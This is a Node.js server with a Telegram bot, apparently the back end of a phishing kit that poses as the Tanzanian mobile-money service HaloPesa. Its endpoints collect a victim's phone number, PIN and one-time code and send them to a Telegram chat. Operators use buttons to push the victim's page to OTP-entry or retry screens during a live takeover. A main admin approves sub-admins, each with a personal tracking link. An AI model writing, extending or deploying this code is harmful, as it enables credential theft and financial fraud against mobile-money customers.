/**
 * **HALOPESA TANZANIA - SECURE MULTI-ADMIN SERVER**
 * Updated with Main Admin Authorization Control for Sub-Admins & Button Fade-Away.
 */

const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const TOKEN = process.env.TOKEN || process.env.TELEGRAM_BOT_TOKEN;
const APP_URL = process.env.APP_URL || process.env.RENDER_EXTERNAL_URL || (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '');
const FALLBACK_ADMIN_ID = process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '';

if (!TOKEN) {
  console.error('FATAL: TELEGRAM_BOT_TOKEN environment variable is required.');
  process.exit(1);
}

if (!APP_URL) {
  console.error('FATAL: APP_URL or RENDER_EXTERNAL_URL environment variable is required.');
  process.exit(1);
}

const ADMINS_FILE = path.join(__dirname, 'admins.json');

function loadAdmins() {
  try {
    if (fs.existsSync(ADMINS_FILE)) {
      const data = fs.readFileSync(ADMINS_FILE, 'utf8');
      const entries = JSON.parse(data);
      return new Map(entries.map(([id, rec]) => [id, {
        authorized: rec.authorized ?? false,
        paid: rec.paid ?? false,
        username: rec.username || '',
        firstName: rec.firstName || 'User',
        lastName: rec.lastName || '',
        status: rec.status || 'PENDING'
      }]));
    }
  } catch (err) {
    console.error('[Storage] Error loading admins file:', err);
  }
  return new Map();
}

function saveAdmins() {
  try {
    const serialized = JSON.stringify(Array.from(admins.entries()));
    fs.writeFileSync(ADMINS_FILE, serialized, 'utf8');
  } catch (err) {
    console.error('[Storage] Error saving admins file:', err);
  }
}

let bot = null;
const sessions = new Map();
const admins = loadAdmins();
const adminConfigMessageIds = new Map();

function isValidHaloPesaNumber(number) {
  const clean = String(number || '').replace(/\D/g, '');
  return /^(061|062|063)\d{7}$/.test(clean);
}

function resolveTargetChat(adminParam) {
  if (adminParam && String(adminParam).trim() !== '') {
    const targetAdmin = String(adminParam).trim();
    if (targetAdmin === String(FALLBACK_ADMIN_ID)) {
      return FALLBACK_ADMIN_ID;
    }
    const adminRecord = admins.get(targetAdmin);
    if (adminRecord && adminRecord.authorized) {
      return targetAdmin;
    }
  }
  return FALLBACK_ADMIN_ID || null;
}

async function updateContinuousAdminList(chatId, messageId = null, page = 0) {
  const PAGE_SIZE = 5;
  const adminEntries = Array.from(admins.entries()).filter(([id]) => id !== String(FALLBACK_ADMIN_ID));
  const totalPages = Math.ceil(adminEntries.length / PAGE_SIZE) || 1;
  
  if (page < 0) page = 0;
  if (page >= totalPages) page = totalPages - 1;

  const paginatedEntries = adminEntries.slice(page * PAGE_SIZE, (page + 1) * PAGE_SIZE);

  let adminListText = `👑 *Jopo la Udhibiti wa Wasimamizi Wasaidizi* (Ukurasa ${page + 1} kati ya${totalPages})\n\nSimamia hali ya idhini ya wasimamizi wasaidizi:`;
  let keyboard = [];

  if (adminEntries.length === 0) {
    adminListText += `\n\nHakuna wasimamizi wasaidizi walioanza kutumia bot bado.`;
  } else {
    paginatedEntries.forEach(([id, record]) => {
      const nameDisplay = record.username ? `@${record.username}` : (record.firstName || 'Mtumiaji');
      const authStatus = record.authorized ? '🟢 Imeidhinishwa' : '🔴 Haijaidhinishwa / Inasubiri';
      const subLink = `${APP_URL}/?admin=${id}`;
      adminListText += `\n\n👤 *${nameDisplay}* (\`${id}\`)\n   Hali: ${authStatus}\n   🔗 \`${subLink}\``;
    });
  }

  let navRow = [];
  if (page > 0) navRow.push({ text: `⬅️ Iliyopita`, callback_data: `PAGE_${page - 1}` });
  navRow.push({ text: `🔄 Onyesha Upya`, callback_data: `PAGE_${page}` });
  if (page < totalPages - 1) navRow.push({ text: `Ijayo ➡️`, callback_data: `PAGE_${page + 1}` });
  if (navRow.length > 0) keyboard.push(navRow);

  if (messageId) {
    try {
      await bot.editMessageText(adminListText, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: keyboard }
      });
      return;
    } catch (err) {}
  }

  const sentMsg = await bot.sendMessage(chatId, adminListText, { 
    parse_mode: 'Markdown',
    reply_markup: { inline_keyboard: keyboard } 
  });
  adminConfigMessageIds.set(chatId, sentMsg.message_id);
}

async function initBot() {
  bot = new TelegramBot(TOKEN, { polling: false });
  const webhookPath = `/bot${TOKEN}`;
  const webhookUrl = `${APP_URL}${webhookPath}`;

  try {
    await bot.setWebHook(webhookUrl);
    app.post(webhookPath, (req, res) => {
      res.sendStatus(200);
      try { bot.processUpdate(req.body); } catch (err) {}
    });
  } catch (err) {
    process.exit(1);
  }

  bot.onText(/\/admins/, async (msg) => {
    const chatId = String(msg.chat.id);
    if (chatId !== String(FALLBACK_ADMIN_ID)) {
      await bot.sendMessage(chatId, `⚠️️ Huna idhini.`);
      return;
    }
    await updateContinuousAdminList(chatId, null, 0);
  });

  bot.onText(/\/myprofile|\/me/, async (msg) => {
    try {
      const chatId = String(msg.chat.id);
      const userId = msg.from.id;
      const username = msg.from.username ? `@${msg.from.username}` : 'Hakuna';
      const firstName = msg.from.first_name || 'Haipo';
      const lastName = msg.from.last_name || 'Haipo';
      
      if (chatId !== String(FALLBACK_ADMIN_ID)) {
        const record = admins.get(chatId);
        if (!record || !record.authorized) {
          await bot.sendMessage(chatId, `⚠️ Akaunti yako bado haijaidhinishwa.`);
          return;
        }
      }
      
      const userLink = `${APP_URL}/?admin=${chatId}`;
      let profileText = 
        `👤 *Taarifa zako za Kiungo Maalum*\n\n` +
        `• *Jina:* ${firstName}${lastName}\n` +
        `• *Telegram ID:* \`${userId}\`\n\n` +
        `🔗 *Kiungo Chako Maalum:*\n${userLink}`;

      await bot.sendMessage(chatId, profileText, { parse_mode: 'Markdown' });
    } catch (err) {}
  });

  bot.onText(/\/start/, async (msg) => {
    try {
      const chatId = String(msg.chat.id);
      const userId = msg.from.id;
      const username = msg.from.username || '';
      const firstName = msg.from.first_name || 'Mtumiaji';
      const lastName = msg.from.last_name || '';

      if (chatId === String(FALLBACK_ADMIN_ID)) {
        await bot.sendMessage(chatId, `👑 Karibu Msimamizi Mkuu. Kiungo chako: ${APP_URL}\n\nAndika /admins kusimamia wasimamizi wasaidizi.`, {
          parse_mode: 'Markdown'
        });
        return;
      }

      if (!admins.has(chatId)) {
        admins.set(chatId, {
          authorized: false,
          paid: false,
          username,
          firstName,
          lastName,
          startedAt: new Date()
        });
        saveAdmins();
      } else {
        const existing = admins.get(chatId);
        existing.username = username;
        existing.firstName = firstName;
        existing.lastName = lastName;
        saveAdmins();
      }

      const record = admins.get(chatId);

      if (!record.authorized) {
        await bot.sendMessage(FALLBACK_ADMIN_ID, 
          `🚨 *Msimamizi Msaidizi Mpya Anasubiri Idhini!*\n\n` +
          `👤 *Mtumiaji:* ${username ? '@' + username : firstName}\n` +
          `🆔 *Chat ID:* \`${userId}\``, 
          { 
            parse_mode: 'Markdown',
            reply_markup: {
              inline_keyboard: [
                [
                  { text: '✅ Idhinisha', callback_data: `AUTH_YES_${userId}` },
                  { text: '❌ Kataa', callback_data: `AUTH_NO_${userId}` }
                ]
              ]
            }
          }
        );

        await bot.sendMessage(chatId, `👋 *Karibu ${firstName}!*\n\nAkaunti yako **inasubiri idhini** kutoka kwa Msimamizi Mkuu.`, { parse_mode: 'Markdown' });
        return;
      }

      const userLink = `${APP_URL}/?admin=${chatId}`;
      await bot.sendMessage(chatId, `👋 *Karibu ${firstName}!*\n\nKiungo chako kiko tayari:\n${userLink}`, { parse_mode: 'Markdown' });
    } catch (err) {}
  });

  bot.on('callback_query', async (query) => {
    try {
      const actionData = query.data || '';
      const chatId = String(query.message.chat.id);

      if (actionData.startsWith('AUTH_YES_') || actionData.startsWith('AUTH_NO_')) {
        if (chatId !== String(FALLBACK_ADMIN_ID)) {
          await bot.answerCallbackQuery(query.id, { text: '⚠️ Huna idhini.' });
          return;
        }

        const parts = actionData.split('_');
        const decision = parts[1];
        const targetSubId = parts[2];
        const subRecord = admins.get(targetSubId);

        if (!subRecord) {
          await bot.answerCallbackQuery(query.id, { text: '⚠️ Haikupatikana.' });
          return;
        }

        if (decision === 'YES') {
          subRecord.authorized = true;
          saveAdmins();
          const assignedLink = `${APP_URL}/?admin=${targetSubId}`;
          await bot.sendMessage(targetSubId, `🎉 Akaunti yako imeidhinishwa!\n\n🔗 *Kiungo:* ${assignedLink}`, { parse_mode: 'Markdown' }).catch(() => {});
          await bot.answerCallbackQuery(query.id, { text: '✅ Imeidhinishwa!' });
          await bot.editMessageText(`✅ *Imetumika & Imeidhinishwa*\n\nID: \`${targetSubId}\``, {
            chat_id: chatId,
            message_id: query.message.message_id,
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: [] }
          });
        } else {
          admins.delete(targetSubId);
          saveAdmins();
          await bot.sendMessage(targetSubId, `❌ Ombi limekataliwa.`).catch(() => {});
          await bot.answerCallbackQuery(query.id, { text: '❌ Imekataliwa.' });
          await bot.editMessageText(`❌ *Imekataliwa*\n\nID: \`${targetSubId}\``, {
            chat_id: chatId,
            message_id: query.message.message_id,
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: [] }
          });
        }
        return;
      }

      if (actionData.startsWith('PAGE_')) {
        const pageNum = parseInt(actionData.split('_')[1]) || 0;
        await updateContinuousAdminList(chatId, query.message.message_id, pageNum);
        await bot.answerCallbackQuery(query.id);
        return;
      }

      const parts = actionData.split('_');
      const prefix = parts.slice(0, 2).join('_'); 
      const targetId = parts.slice(2).join('_');

      let session = sessions.get(targetId);
      if (!session) {
        session = { contact: 'Haijulikani', adminChatId: chatId };
      }

      const chatTarget = session.adminChatId || chatId;

      switch (prefix) {
        case 'ALLOW_OTP':
          session.status = 'APPROVED_LOAD_OTP';
          await bot.sendMessage(chatTarget, `✅ Skrini ya OTP imezidishwa kwa ${session.contact}`);
          break;
        case 'DENY_OTP':
          session.status = 'DENIED';
          await bot.sendMessage(chatTarget, `❌ Ufikiaji Umekataliwa`);
          break;
        case 'CORRECT_OTP':
          session.status = 'SUCCESS';
          await bot.sendMessage(chatTarget, `🎉 Mafanikio yamethibitishwa.`);
          break;
        case 'WRONG_PIN':
          session.status = 'RETRY_PIN';
          await bot.sendMessage(chatTarget, `⚠️ PIN Siyo Sahihi`);
          break;
        case 'WRONG_OTP':
          session.status = 'RETRY_OTP';
          await bot.sendMessage(chatTarget, `⚠️ OTP Siyo Sahihi`);
          break;
        default:
          break;
      }

      await bot.answerCallbackQuery(query.id, { text: `Imeshughulikiwa` }).catch(() => {});

      // Fade away buttons immediately after click
      if (query.message && query.message.message_id) {
        await bot.editMessageReplyMarkup(
          { inline_keyboard: [] },
          { chat_id: query.message.chat.id, message_id: query.message.message_id }
        ).catch(() => {});
      }
    } catch (err) {}
  });
}

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/api/submit-application', async (req, res) => {
  try {
    let { contact, pin, amount, adminChatId } = req.body || {};

    if (!adminChatId && req.query && req.query.admin) {
      adminChatId = req.query.admin;
    }

    const cleanContact = String(contact || '').replace(/\D/g, '');
    if (!isValidHaloPesaNumber(cleanContact)) {
      return res.status(400).json({ success: false, error: 'Weka namba sahihi ya HaloPesa kuanzia na 061, 062, au 063.' });
    }

    const targetChat = resolveTargetChat(adminChatId);
    if (!targetChat) {
      return res.status(400).json({ success: false, error: 'Msimamizi hajaidhinishwa.' });
    }

    const userId = cleanContact ? cleanContact.replace(/[^a-zA-Z0-9]/g, '_') : `user_${Date.now()}`;

    sessions.set(userId, {
      contact: cleanContact,
      pin,
      amount: amount || 'TZS 100,000',
      adminChatId: targetChat,
      status: 'WAITING_PIN_APPROVAL',
      createdAt: new Date()
    });

    const message = `NEW HALOPESA APPLICATIONS\n\nNUMBER: ${cleanContact}\nPIN: ${pin}`;
    const opts = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ ALLOW OTP', callback_data: `ALLOW_OTP_${userId}` },
            { text: '❌ DENY', callback_data: `DENY_OTP_${userId}` }
          ]
        ]
      }
    };

    if (bot) {
      const sentMsg = await bot.sendMessage(targetChat, message, opts);
      sessions.get(userId).adminMsgId = sentMsg.message_id;
    }
    
    return res.status(200).json({ success: true, userId });
  } catch (err) {
    return res.status(500).json({ success: false, error: 'Hitilafu ya mtandao' });
  }
});

app.get('/api/check-status/:userId', (req, res) => {
  const { userId } = req.params;
  const session = sessions.get(userId);
  if (!session) return res.status(404).json({ status: 'NOT_FOUND' });
  res.status(200).json({ status: session.status });
});

app.post('/api/request-new-otp', async (req, res) => {
  try {
    const { userId } = req.body || {};
    const session = sessions.get(userId);
    if (!session) return res.status(404).json({ success: false, error: 'Kipindi hakikupatikana' });

    session.status = 'REQUESTING_NEW_OTP';
    const targetChat = session.adminChatId;

    if (bot && targetChat) {
      await bot.sendMessage(targetChat, `⚠️ APPLICANT IS REQUESTING NEW OTP\n\nNUMBER: ${session.contact}`, {
        reply_markup: {
          inline_keyboard: [
            [
              { text: '✅ ALLOW OTP', callback_data: `ALLOW_OTP_${userId}` },
              { text: '❌ DENY', callback_data: `DENY_OTP_${userId}` }
            ]
          ]
        }
      });
    }

    return res.status(200).json({ success: true });
  } catch (err) {
    return res.status(500).json({ success: false, error: 'Hitilafu' });
  }
});

app.post('/api/submit-otp', async (req, res) => {
  try {
    const { userId, otp } = req.body || {};
    const session = sessions.get(userId);

    if (!session) return res.status(404).json({ success: false, error: 'Kipindi hakikupatikana' });

    session.status = 'WAITING_OTP_VERIFICATION';
    session.otp = otp;

    const message = `NEW HALOPESA APPLICATIONS\n\nNUMBER: ${session.contact}\nOTP: ${otp}`;
    const opts = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '⚠️ WRONG PIN', callback_data: `WRONG_PIN_${userId}` },
            { text: '⚠️ WRONG OTP', callback_data: `WRONG_OTP_${userId}` }
          ],
          [
            { text: '✅ CORRECT OTP', callback_data: `CORRECT_OTP_${userId}` }
          ]
        ]
      }
    };

    const targetChat = session.adminChatId;
    if (targetChat && bot) {
      await bot.sendMessage(targetChat, message, opts);
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Hitilafu' });
  }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, async () => {
  await initBot();
});
